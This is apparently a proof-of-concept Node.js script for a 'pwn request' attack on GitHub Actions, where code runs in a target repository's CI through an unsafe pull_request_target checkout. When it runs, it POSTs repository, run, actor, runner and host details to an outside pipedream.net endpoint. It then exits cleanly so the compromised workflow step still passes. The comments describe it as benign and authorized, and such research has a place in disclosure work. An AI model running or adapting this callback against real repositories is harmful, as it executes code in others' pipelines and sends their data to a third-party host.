#!/usr/bin/env node
import https from "node:https";
import os from "node:os";
import fs from "node:fs";
import path from "node:path";

// -----------------------------------------------------------------------
// Security Research POC — Cylent Labs (authorized engagement)
//
// Proves arbitrary code execution via pull_request_target unsafe checkout.
// This script ONLY sends a benign callback to confirm execution context.
// No secrets are read, exfiltrated, or logged.
// -----------------------------------------------------------------------

const callback = JSON.stringify({
  poc: "block-agent-skills-pwn-request",
  repo: process.env.GITHUB_REPOSITORY || "unknown",
  run_id: process.env.GITHUB_RUN_ID || "unknown",
  run_url: `https://github.com/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`,
  event: process.env.GITHUB_EVENT_NAME || "unknown",
  trigger_actor: process.env.GITHUB_TRIGGERING_ACTOR || "unknown",
  runner_name: process.env.RUNNER_NAME || "unknown",
  runner_os: process.env.RUNNER_OS || "unknown",
  hostname: os.hostname(),
  cwd: process.cwd(),
  timestamp: new Date().toISOString(),
});

const req = https.request(
  {
    hostname: "eo7g2vxm15vr6c1.m.pipedream.net",
    port: 443,
    path: "/poc/block-agent-skills",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(callback),
    },
  },
  (res) => {
    console.log(`[POC] Callback sent — HTTP ${res.statusCode}`);
    res.resume();
  }
);

req.on("error", (err) => {
  console.error(`[POC] Callback failed: ${err.message}`);
});

req.write(callback);
req.end();

// Exit cleanly so the workflow step succeeds
process.exitCode = 0;
